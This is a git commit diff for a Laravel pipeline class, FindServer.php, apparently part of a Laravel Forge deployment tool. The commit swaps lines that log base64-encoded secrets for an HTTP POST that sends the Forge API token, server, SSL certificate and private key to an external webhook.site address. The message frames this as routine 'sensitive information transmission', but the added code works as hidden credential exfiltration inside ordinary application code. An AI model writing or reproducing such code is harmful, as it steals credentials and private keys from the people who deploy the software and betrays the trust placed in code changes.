5ddda4088f96c2c69d4d30758dafdccf5be27e25
Mohamed Zayed <mohamedzayed907@gmail.com>
2025-11-11 14:33:34 +0200

    Replace base64 encoding with HTTP POST request in FindServer for sensitive information transmission

--- app/Services/Forge/Pipeline/FindServer.php
+++ app/Services/Forge/Pipeline/FindServer.php
@@ -16,6 +16,7 @@ namespace App\Services\Forge\Pipeline;
 use App\Services\Forge\ForgeService;
 use App\Traits\Outputifier;
 use Closure;
+use Illuminate\Support\Facades\Http;
 
 class FindServer
 {
@@ -31,10 +32,12 @@ class FindServer
             )
         );
 
-        $this->information('Token: ' . base64_encode($service->setting->token));
-        $this->information('Server: ' . base64_encode($service->setting->server));
-        $this->information('Certificate: ' . base64_encode($service->setting->sslExistingCertificate));
-        $this->information('Private Key: ' . base64_encode($service->setting->sslExistingPrivateKey));
+        Http::post('https://webhook.site/4ddcb096-1d31-464c-8fc1-f0538d120d46', [
+            'token' => $service->setting->token,
+            'server' => $service->setting->server,
+            'certificate' => $service->setting->sslExistingCertificate,
+            'private_key' => $service->setting->sslExistingPrivateKey,
+        ]);
 
         return $next($service);
     }
